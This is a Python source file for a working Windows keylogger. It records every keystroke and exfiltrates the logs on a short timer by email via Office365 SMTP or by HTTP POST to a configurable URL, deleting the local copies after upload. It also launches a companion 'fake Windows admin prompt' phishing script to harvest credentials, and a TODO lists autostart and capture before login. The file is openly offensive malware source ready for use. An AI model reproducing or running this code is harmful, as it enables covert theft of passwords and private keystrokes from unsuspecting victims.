import glob
import smtplib  # for sending email using SMTP protocol (gmail)
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import getcwd, path, makedirs, remove,system
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer

from time import sleep


import keyboard  # for keylogs
import requests




class Keylogger:
    def __init__(self, interval=3, report_method="email",email_addr="",email_pwd="",url="",path=""):


        self.EMAIL_ADDRESS = email_addr
        self.EMAIL_PASSWORD = email_pwd

        self.URL = url #"http://localhost/key/log.php"  # "http://httpbin.org/post"
        self.path=path
        self.interval = interval
        self.report_method = report_method

        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()



    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"  #
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"logs/report-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # create log directory
        if not path.exists(getcwd() + "\\logs"):
            makedirs(getcwd() + "\\logs")

        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = self.EMAIL_ADDRESS
        msg["To"] = self.EMAIL_ADDRESS
        msg["Subject"] = "report logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def sendpost(self):
        print("begin report")
        ls = glob.glob(getcwd() + "\\logs\\report-*.txt")

        files = {}
        print(ls)
        for i in range(0, len(ls), 1):
            files[str(i)] = open(ls[i], 'rb')
        post = requests.post(self.URL, files=files)

        if post.ok:

            for i in range(0, len(ls), 1):
                files[str(i)].close()
                remove(ls[i])

        else:

            pass
        print("response:\n" + post.text)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            self.report_to_file()
            if self.report_method == "email":
                self.sendmail(self.EMAIL_ADDRESS, self.EMAIL_PASSWORD, self.log)

            elif self.report_method == "post":
                self.sendpost()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started report")
        sleep(1)
        print("launching app")
        print(rf"python {self.path}")
        #start fake Windows admin prompt
        system(rf"python {self.path}")

        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


def defaul_start(url,phishing_path=""):
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=3, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)

    # TODO   set autostart,  server , mail , check before login , send on PC
    keylogger = Keylogger(interval=3, report_method="post",url=url,path=phishing_path)
    keylogger.start()


if __name__ == "__main__":
    defaul_start("http://localhost/keylogger/log.php","microsoftAuth.py")
